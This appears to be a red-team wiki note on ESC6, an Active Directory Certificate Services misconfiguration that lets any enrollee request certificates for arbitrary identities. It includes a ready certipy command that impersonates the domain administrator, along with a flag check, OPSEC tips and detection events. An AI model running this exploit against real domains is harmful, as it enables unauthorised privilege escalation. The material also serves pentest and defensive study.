---
title: "ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2 (CA-wide SAN)"
type: concept
created: 2026-09-07
updated: 2026-09-07
tags: [active-directory, ad-cs, esc, privilege-escalation]
---

# ESC6

The CA-wide version of [[esc1]]. When the CA has the
**`EDITF_ATTRIBUTESUBJECTALTNAME2`** flag set, **any** enrollee can specify an
arbitrary **SAN** in the request **regardless of the template** — so even a
locked-down client-auth template becomes an ESC1. One CA misconfig makes every
enrollable client-auth template abusable.

Note: Microsoft's May 2022 update ([[certificate-mapping]] / SID binding) blunts
naïve ESC6 where full enforcement is on, but many CAs remain vulnerable.

## Exploit

```bash
# same as ESC1 but works against a normally-safe template because the CA honors the SAN
certipy req -u user@corp.local -p 'Pass' -ca CORP-CA -template User \
  -upn administrator@corp.local
```

Check the flag:

```powershell
certutil -config "CA-HOST\CORP-CA" -getreg policy\EditFlags
```

## Red-team notes (OPSEC)

- One of the highest-impact single findings — flag it even if you don't fire it.
- Setting the flag is [[esc7]] (ManageCA); reading it is passive.

## Detection

- CA config change enabling `EDITF_ATTRIBUTESUBJECTALTNAME2`; issuance where
  requester ≠ SAN (4886/4887).

## Links

- [[ad-cs-esc-attacks]], [[esc1]], [[esc7]], [[certificate-mapping]]
- [[certipy]], [[certified-pre-owned]]
